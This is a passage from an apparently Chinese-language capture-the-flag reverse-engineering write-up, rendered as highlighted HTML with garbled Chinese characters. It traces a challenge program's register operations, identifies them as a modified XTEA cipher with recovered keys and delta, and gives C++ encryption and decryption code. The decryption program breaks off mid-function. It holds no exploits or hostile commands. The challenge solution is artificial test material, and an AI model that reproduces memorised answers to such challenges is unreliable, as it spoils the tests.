--- <span class="number">32323232</span> &gt;&gt; <span class="number">5</span> = <span class="number">1919191</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">32323232</span> &lt;&lt; <span class="number">6</span> = c8c8c8c80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">1919191</span> ^ <span class="number">8</span>c8c8c80 = <span class="number">8</span>d1d1d11</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">32323232</span> ^ <span class="number">11223344</span> = <span class="number">23100176</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">8</span>d1d1d11 + <span class="number">23100176</span> = b02d<span class="number">1e87</span></span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">0</span> &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">0</span> = <span class="number">776</span>f6853</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">776</span>f6853 ^ abab1212 = dcc47a41</span><br><span class="line">W3 = W1 ^ W0 --- b02d<span class="number">1e87</span> ^ dcc47a41 = <span class="number">6</span>ce964c6</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6</span>ce964c6 + <span class="number">31313131</span> = <span class="number">9e1</span>a95f7</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9e1</span>a95f7 &gt;&gt; <span class="number">4</span> = <span class="number">9e1</span>a95f</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">9e1</span>a95f7 &lt;&lt; <span class="number">7</span> = <span class="number">4</span>f0d4afb80</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">9e1</span>a95f ^ d4afb80 = <span class="number">4</span>ab52df</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9e1</span>a95f7 ^ <span class="number">55667788</span> = cb7ce27f</span><br><span class="line">W2 = W1 + W0 --- <span class="number">4</span>ab52df + cb7ce27f = d028355e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &gt;&gt; b = bebfc</span><br><span class="line">W2 = W0 &amp; W3 --- bebfc &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">5</span>f5fe<span class="number">6e7</span> = d6cf4f3a</span><br><span class="line">W2 = W0 ^ W3 --- d6cf4f3a ^ <span class="number">23235566</span> = f5ec1a5c</span><br><span class="line">W3 = W1 ^ W0 --- f5ec1a5c ^ d028355e = <span class="number">25</span>c42f02</span><br><span class="line">W2 = W1 + W0 --- <span class="number">25</span>c42f02 + <span class="number">32323232</span> = <span class="number">57</span>f66134</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">57</span>f66134 &gt;&gt; <span class="number">5</span> = <span class="number">2</span>bfb309</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">57</span>f66134 &lt;&lt; <span class="number">6</span> = <span class="number">15</span>fd984d00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">2</span>bfb309 ^ fd984d00 = ff27fe09</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">57</span>f66134 ^ <span class="number">11223344</span> = <span class="number">46</span>d45270</span><br><span class="line">W2 = W1 + W0 --- ff27fe09 + <span class="number">46</span>d45270 = <span class="number">145</span>fc5079</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">5</span>f5fe<span class="number">6e7</span> &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">5</span>f5fe<span class="number">6e7</span> = d3c94c4b</span><br><span class="line">W2 = W0 ^ W3 --- d3c94c4b ^ abab1212 = <span class="number">78625e59</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">45</span>fc5079 ^ <span class="number">78625e59</span> = <span class="number">3</span>d<span class="number">9e0</span>e20</span><br><span class="line">W2 = W1 + W0 --- <span class="number">3</span>d<span class="number">9e0</span>e20 + <span class="number">9e1</span>a95f7 = dbb8a417</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dbb8a417 &gt;&gt; <span class="number">4</span> = dbb8a41</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- dbb8a417 &lt;&lt; <span class="number">7</span> = <span class="number">6</span>ddc520b80</span><br><span class="line">W3 = W1 ^ W0 --- dbb8a41 ^ dc520b80 = d<span class="number">1e981</span>c1</span><br><span class="line">W2 = W0 ^ W3 --- dbb8a417 ^ <span class="number">55667788</span> = <span class="number">8</span>eded39f</span><br><span class="line">W2 = W1 + W0 --- d<span class="number">1e981</span>c1 + <span class="number">8</span>eded39f = <span class="number">160</span>c85560</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bebfcdce &gt;&gt; b = <span class="number">17</span>d7f9</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">17</span>d7f9 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + bebfcdce = <span class="number">1242</span>b2f3b</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">242</span>b2f3b ^ <span class="number">23235566</span> = <span class="number">7087</span>a5d</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7087</span>a5d ^ <span class="number">60</span>c85560 = <span class="number">67</span>c02f3d</span><br><span class="line">W2 = W1 + W0 --- <span class="number">67</span>c02f3d + <span class="number">57</span>f66134 = bfb69071</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfb69071 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>fdb483</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfb69071 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>feda41c40</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>fdb483 ^ eda41c40 = e859a8c3</span><br><span class="line">W2 = W0 ^ W3 --- bfb69071 ^ <span class="number">11223344</span> = ae94a335</span><br><span class="line">W2 = W1 + W0 --- e859a8c3 + ae94a335 = <span class="number">196</span>ee4bf8</span><br><span class="line">W2 = W0 &amp; W3 --- bebfcdce &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + bebfcdce = <span class="number">1202</span>d2d40</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">202</span>d2d40 ^ abab1212 = <span class="number">8</span>b863f52</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">96</span>ee4bf8 ^ <span class="number">8</span>b863f52 = <span class="number">1</span>d6874aa</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>d6874aa + dbb8a417 = f92118c1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f92118c1 &gt;&gt; <span class="number">4</span> = f92118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f92118c1 &lt;&lt; <span class="number">7</span> = <span class="number">7</span>c908c6080</span><br><span class="line">W3 = W1 ^ W0 --- f92118c ^ <span class="number">908</span>c6080 = <span class="number">9</span>f<span class="number">1e710</span>c</span><br><span class="line">W2 = W0 ^ W3 --- f92118c1 ^ <span class="number">55667788</span> = ac476f49</span><br><span class="line">W2 = W1 + W0 --- <span class="number">9</span>f<span class="number">1e710</span>c + ac476f49 = <span class="number">14</span>b<span class="number">65e055</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">1e1f</span>b4b5 &gt;&gt; b = <span class="number">3</span>c3f6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">1e1f</span>b4b5 = <span class="number">7</span>f8d1427</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7</span>f8d1427 ^ <span class="number">23235566</span> = <span class="number">5</span>cae4141</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>cae4141 ^ <span class="number">4</span>b<span class="number">65e055</span> = <span class="number">17</span>cba114</span><br><span class="line">W2 = W1 + W0 --- <span class="number">17</span>cba114 + bfb69071 = d7823185</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- d7823185 &gt;&gt; <span class="number">5</span> = <span class="number">6</span>bc118c</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- d7823185 &lt;&lt; <span class="number">6</span> = <span class="number">35e08</span>c6140</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">6</span>bc118c ^ e08c6140 = e63070cc</span><br><span class="line">W2 = W0 ^ W3 --- d7823185 ^ <span class="number">11223344</span> = c6a002c1</span><br><span class="line">W2 = W1 + W0 --- e63070cc + c6a002c1 = <span class="number">1</span>acd0738d</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1e1f</span>b4b5 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">1e1f</span>b4b5 = <span class="number">838</span>b1622</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">838</span>b1622 ^ abab1212 = <span class="number">28200430</span></span><br><span class="line">W3 = W1 ^ W0 --- acd0738d ^ <span class="number">28200430</span> = <span class="number">84</span>f077bd</span><br><span class="line">W2 = W1 + W0 --- <span class="number">84</span>f077bd + f92118c1 = <span class="number">17e11907</span>e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7e11907</span>e &gt;&gt; <span class="number">4</span> = <span class="number">7e11907</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">7e11907</span>e &lt;&lt; <span class="number">7</span> = <span class="number">3</span>f08c83f00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7e11907</span> ^ <span class="number">8</span>c83f00 = f292607</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">7e11907</span>e ^ <span class="number">55667788</span> = <span class="number">2</span>b<span class="number">77e7f</span>6</span><br><span class="line">W2 = W1 + W0 --- f292607 + <span class="number">2</span>b<span class="number">77e7f</span>6 = <span class="number">3</span>aa10dfd</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">7</span>d7f9b9c &gt;&gt; b = faff3</span><br><span class="line">W2 = W0 &amp; W3 --- faff3 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + <span class="number">7</span>d7f9b9c = f<span class="number">1e90100</span></span><br><span class="line">W2 = W0 ^ W3 --- f<span class="number">1e90100</span> ^ <span class="number">23235566</span> = d2ca5466</span><br><span class="line">W3 = W1 ^ W0 --- d2ca5466 ^ <span class="number">3</span>aa10dfd = e86b599b</span><br><span class="line">W2 = W1 + W0 --- e86b599b + d7823185 = <span class="number">1</span>bfed8b20</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- bfed8b20 &gt;&gt; <span class="number">5</span> = <span class="number">5</span>ff6c59</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- bfed8b20 &lt;&lt; <span class="number">6</span> = <span class="number">2</span>ffb62c800</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">5</span>ff6c59 ^ fb62c800 = fe9da459</span><br><span class="line">W2 = W0 ^ W3 --- bfed8b20 ^ <span class="number">11223344</span> = aecfb864</span><br><span class="line">W2 = W1 + W0 --- fe9da459 + aecfb864 = <span class="number">1</span>ad6d5cbd</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">7</span>d7f9b9c &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + <span class="number">7</span>d7f9b9c = f4ef03ef</span><br><span class="line">W2 = W0 ^ W3 --- f4ef03ef ^ abab1212 = <span class="number">5</span>f4411fd</span><br><span class="line">W3 = W1 ^ W0 --- ad6d5cbd ^ <span class="number">5</span>f4411fd = f2294d40</span><br><span class="line">W2 = W1 + W0 --- f2294d40 + <span class="number">7e11907</span>e = <span class="number">1703</span>addbe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">703</span>addbe &gt;&gt; <span class="number">4</span> = <span class="number">703</span>addb</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">703</span>addbe &lt;&lt; <span class="number">7</span> = <span class="number">381</span>d6edf00</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">703</span>addb ^ <span class="number">1</span>d6edf00 = <span class="number">1</span>a6d72db</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">703</span>addbe ^ <span class="number">55667788</span> = <span class="number">255</span>caa36</span><br><span class="line">W2 = W1 + W0 --- <span class="number">1</span>a6d72db + <span class="number">255</span>caa36 = <span class="number">3</span>fca1d11</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- dcdf8283 &gt;&gt; b = <span class="number">1</span>b9bf0</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>b9bf0 &amp; <span class="number">3</span> = <span class="number">0</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">776</span>f6853 + dcdf8283 = <span class="number">1544</span>eead6</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">544</span>eead6 ^ <span class="number">23235566</span> = <span class="number">776</span>dbfb0</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">776</span>dbfb0 ^ <span class="number">3</span>fca1d11 = <span class="number">48</span>a7a2a1</span><br><span class="line">W2 = W1 + W0 --- <span class="number">48</span>a7a2a1 + bfed8b20 = <span class="number">108952</span>dc1</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">8952</span>dc1 &gt;&gt; <span class="number">5</span> = <span class="number">44</span>a96e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">8952</span>dc1 &lt;&lt; <span class="number">6</span> = <span class="number">2254</span>b7040</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">44</span>a96e ^ <span class="number">254</span>b7040 = <span class="number">250</span>fd92e</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">8952</span>dc1 ^ <span class="number">11223344</span> = <span class="number">19</span>b<span class="number">71e85</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">250</span>fd92e + <span class="number">19</span>b<span class="number">71e85</span> = <span class="number">3</span>ec6f7b3</span><br><span class="line">W2 = W0 &amp; W3 --- dcdf8283 &amp; <span class="number">3</span> = <span class="number">3</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">74696564</span> + dcdf8283 = <span class="number">15148e7</span>e7</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5148e7</span>e7 ^ abab1212 = fae3f5f5</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">3</span>ec6f7b3 ^ fae3f5f5 = c4250246</span><br><span class="line">W2 = W1 + W0 --- c4250246 + <span class="number">703</span>addbe = <span class="number">1345</span>fe004</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">345</span>fe004 &gt;&gt; <span class="number">4</span> = <span class="number">345</span>fe00</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">345</span>fe004 &lt;&lt; <span class="number">7</span> = <span class="number">1</span>a2ff00200</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">345</span>fe00 ^ <span class="number">2</span>ff00200 = <span class="number">2</span>cb5fc00</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">345</span>fe004 ^ <span class="number">55667788</span> = <span class="number">6139978</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">2</span>cb5fc00 + <span class="number">6139978</span>c = <span class="number">8</span>def938c</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">3</span>c3f696a &gt;&gt; b = <span class="number">787</span>ed</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">787</span>ed &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">3</span>c3f696a = a1aacad7</span><br><span class="line">W2 = W0 ^ W3 --- a1aacad7 ^ <span class="number">23235566</span> = <span class="number">82899</span>fb1</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">82899</span>fb1 ^ <span class="number">8</span>def938c = f660c3d</span><br><span class="line">W2 = W1 + W0 --- f660c3d + <span class="number">8952</span>dc1 = <span class="number">17</span>fb39fe</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">17</span>fb39fe &gt;&gt; <span class="number">5</span> = bfd9cf</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">17</span>fb39fe &lt;&lt; <span class="number">6</span> = <span class="number">5</span>fece7f80</span><br><span class="line">W3 = W1 ^ W0 --- bfd9cf ^ fece7f80 = fe71a64f</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">17</span>fb39fe ^ <span class="number">11223344</span> = <span class="number">6</span>d90aba</span><br><span class="line">W2 = W1 + W0 --- fe71a64f + <span class="number">6</span>d90aba = <span class="number">1054</span>ab109</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">3</span>c3f696a &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">3</span>c3f696a = <span class="number">9</span>dacc8dc</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">9</span>dacc8dc ^ abab1212 = <span class="number">3607</span>dace</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">54</span>ab109 ^ <span class="number">3607</span>dace = <span class="number">334</span>d6bc7</span><br><span class="line">W2 = W1 + W0 --- <span class="number">334</span>d6bc7 + <span class="number">345</span>fe004 = <span class="number">67</span>ad4bcb</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">67</span>ad4bcb &gt;&gt; <span class="number">4</span> = <span class="number">67</span>ad4bc</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">67</span>ad4bcb &lt;&lt; <span class="number">7</span> = <span class="number">33</span>d6a<span class="number">5e580</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">67</span>ad4bc ^ d6a<span class="number">5e580</span> = d0df313c</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">67</span>ad4bcb ^ <span class="number">55667788</span> = <span class="number">32</span>cb3c43</span><br><span class="line">W2 = W1 + W0 --- d0df313c + <span class="number">32</span>cb3c43 = <span class="number">103</span>aa6d7f</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">9</span>b9f5051 &gt;&gt; b = <span class="number">1373</span>ea</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1373</span>ea &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + <span class="number">9</span>b9f5051 = fd0cafc3</span><br><span class="line">W2 = W0 ^ W3 --- fd0cafc3 ^ <span class="number">23235566</span> = de2ffaa5</span><br><span class="line">W3 = W1 ^ W0 --- de2ffaa5 ^ <span class="number">3</span>aa6d7f = dd8597da</span><br><span class="line">W2 = W1 + W0 --- dd8597da + <span class="number">17</span>fb39fe = f580d1d8</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- f580d1d8 &gt;&gt; <span class="number">5</span> = <span class="number">7</span>ac068e</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- f580d1d8 &lt;&lt; <span class="number">6</span> = <span class="number">3</span>d60347600</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>ac068e ^ <span class="number">60347600</span> = <span class="number">6798708</span>e</span><br><span class="line">W2 = W0 ^ W3 --- f580d1d8 ^ <span class="number">11223344</span> = e4a<span class="number">2e29</span>c</span><br><span class="line">W2 = W1 + W0 --- <span class="number">6798708</span>e + e4a<span class="number">2e29</span>c = <span class="number">14</span>c3b532a</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">9</span>b9f5051 &amp; <span class="number">3</span> = <span class="number">1</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">656</span>b616d + <span class="number">9</span>b9f5051 = <span class="number">1010</span>ab1be</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">10</span>ab1be ^ abab1212 = aaa1a3ac</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4</span>c3b532a ^ aaa1a3ac = e69af086</span><br><span class="line">W2 = W1 + W0 --- e69af086 + <span class="number">67</span>ad4bcb = <span class="number">14e483</span>c51</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- <span class="number">4e483</span>c51 &gt;&gt; <span class="number">4</span> = <span class="number">4e483</span>c5</span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4e483</span>c51 &lt;&lt; <span class="number">7</span> = <span class="number">27241e2880</span></span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">4e483</span>c5 ^ <span class="number">241e2880</span> = <span class="number">20</span>faab45</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">4e483</span>c51 ^ <span class="number">55667788</span> = <span class="number">1</span>b<span class="number">2e4</span>bd9</span><br><span class="line">W2 = W1 + W0 --- <span class="number">20</span>faab45 + <span class="number">1</span>b<span class="number">2e4</span>bd9 = <span class="number">3</span>c28f71e</span><br><span class="line">W3 = W1 &gt;&gt; W0 --- faff3738 &gt;&gt; b = <span class="number">1</span>f5fe6</span><br><span class="line">W2 = W0 &amp; W3 --- <span class="number">1</span>f5fe6 &amp; <span class="number">3</span> = <span class="number">2</span></span><br><span class="line">W2 = W1 + W0 --- <span class="number">616</span>d5f72 + faff3738 = <span class="number">15</span>c6c96aa</span><br><span class="line">W2 = W0 ^ W3 --- <span class="number">5</span>c6c96aa ^ <span class="number">23235566</span> = <span class="number">7</span>f4fc3cc</span><br><span class="line">W3 = W1 ^ W0 --- <span class="number">7</span>f4fc3cc ^ <span class="number">3</span>c28f71e = <span class="number">436734</span>d2</span><br><span class="line">W2 = W1 + W0 --- <span class="number">436734</span>d2 + f580d1d8 = <span class="number">138e806</span>aa</span><br></pre></td></tr></table></figure><p>é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°æ˜¯ä¸€ä¸ªé­”æ”¹çš„XTeaåŠ å¯†ã€‚</p><p>é€šè¿‡å¯¹æ¯”æ ‡å‡†XTeaåŠ å¯†æµç¨‹ï¼Œå¯ä»¥å¾—åˆ°é‡Œé¢å‚ä¸è®¡ç®—çš„4ä¸ªkeyå€¼ <strong>{0x776f6853,0x656b616d,0x616d5f72,0x74696564}</strong> ä»¥åŠdeltaå€¼ <strong>0x5f5fe6e7</strong></p><p>å†™å‡ºå¯¹åº”åŠ å¯†çš„c++ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 += tmp2;</span><br><span class="line">        sum += delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 += tmp4;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æå–chalç¨‹åºä¸­çš„å¯†æ–‡ï¼Œè¿›è¡Œè§£å¯†å³å¯ã€‚</p><p>å®Œæ•´è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decipher</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0x5f5fe6e7</span> * <span class="number">72</span>, delta = <span class="number">0x5f5fe6e7</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">72</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> tmp3 = (((v0 &lt;&lt; <span class="number">7</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + (v0 ^ <span class="number">0x55667788</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp4 = ((key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + sum) ^ <span class="number">0x23235566</span> ^ tmp3);</span><br><span class="line">        v1 -= tmp4;</span><br><span class="line">        sum -= delta;</span><br><span class="line">        <span class="keyword">auto</span> tmp = (((v1 &lt;&lt; <span class="number">6</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + (v1 ^ <span class="number">0x11223344</span>));</span><br><span class="line">        <span class="keyword">auto</span> tmp2 = (((key[sum &amp; <span class="number">3</span>] + sum) ^ <span class="number">0xabab1212</span>) ^ 